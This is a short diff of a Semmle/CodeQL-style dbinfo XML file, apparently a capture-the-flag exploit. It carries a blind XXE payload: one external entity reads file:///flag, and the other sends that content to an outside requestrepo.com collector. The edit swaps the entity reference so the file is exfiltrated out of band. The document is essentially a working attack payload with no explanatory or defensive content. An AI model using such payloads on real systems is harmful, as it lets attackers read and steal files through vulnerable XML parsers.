@@ -3,7 +3,7 @@
 <!ENTITY % xxe SYSTEM "file:///flag">
 <!ENTITY blind SYSTEM "http://krhelbvr.requestrepo.com/?%xxe;">]>
 <ns2:dbinfo xmlns:ns2="https://semmle.com/schemas/dbinfo">
-    <sourceLocationPrefix>&flag;</sourceLocationPrefix>
+    <sourceLocationPrefix>&blind;</sourceLocationPrefix>
     <baselineLinesOfCode>420</baselineLinesOfCode>
     <unicodeNewlines>false</unicodeNewlines>
     <columnKind>utf16</columnKind>
